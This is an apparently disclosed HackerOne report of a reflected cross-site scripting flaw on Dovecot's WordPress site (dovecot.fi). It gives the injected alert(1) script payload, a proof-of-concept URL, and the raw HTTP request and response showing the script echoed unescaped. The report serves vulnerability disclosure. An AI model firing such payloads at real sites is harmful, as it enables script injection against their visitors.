@@ -1,0 +1,53 @@
+ReportLink:https://hackerone.com/reports/135316
+WeaknessName:Cross-site Scripting (XSS) - Generic
+Reporter:https://hackerone.com/kanti
+ReportedTo:Dovecot(dovecot)
+BountyAmount:
+Severity:
+State:Closed
+DateOfDisclosure:09.05.2016 6:05:12
+
+Summary:
+
+Issue detail
+The name of an arbitrarily supplied URL parameter is copied into the value of an HTML tag attribute which is encapsulated in double quotation marks. The payload e400a"><script>alert(1)</script>5bd8b was submitted in the name of an arbitrarily supplied URL parameter. This input was echoed as e400a\"><script>alert(1)</script>5bd8b in the application's response.
+
+This proof-of-concept attack demonstrates that it is possible to inject arbitrary JavaScript into the application's response.
+
+POC::::
+1 Goto http://www.dovecot.fi/wp-content/plugins/nextgen-gallery/products/photocrati_nextgen/modules/ngglegacy/css/hovereffect.css?e400a%22%3E%3Cscript%3Ealert%281%29%3C/script%3E5bd8b=1%20HTTP/1.1
+
+Then See out put 
+
+Request
+GET /wp-content/plugins/nextgen-gallery/products/photocrati_nextgen/modules/ngglegacy/css/hovereffect.css?e400a"><script>alert(1)<%2fscript>5bd8b=1 HTTP/1.1
+Host: www.dovecot.fi
+Accept: */*
+Accept-Language: en
+User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
+Connection: close
+
+Response
+HTTP/1.1 404 Not Found
+Date: Fri, 29 Apr 2016 07:34:16 GMT
+Server: Apache/2.4.10 (Debian)
+X-Frame-Options: SAMEORIGIN
+X-XSS-Protection: 1; mode=block
+X-Content-Type-Options: nosniff
+Expires: Wed, 11 Jan 1984 05:00:00 GMT
+Cache-Control: no-cache, must-revalidate, max-age=0
+Pragma: no-cache
+Link: <http://www.dovecot.fi/wp-json/>; rel="https://api.w.org/"
+Connection: close
+Content-Type: text/html; charset=UTF-8
+Content-Length: 21840
+
+<!DOCTYPE HTML><html lang="en-US">
+
+<head>
+<meta charset="UTF-8" />
+<link rel="profile" href="http://gmpg.org/xfn/11" />
+<title>Page not found &#8211; The world&#039;s most popular IMAP server!</title
+...[SNIP]...
+<a href="http://www.dovecot.fi/wp-content/plugins/nextgen-gallery/products/photocrati_nextgen/modules/ngglegacy/css/hovereffect.css?e400a\"><script>alert(1)</script>5bd8b=1&full-site=true" rel="nofollow" class="footer-responsive-grid-link footer-responsive-grid-disable footer-link">
+...[SNIP]...
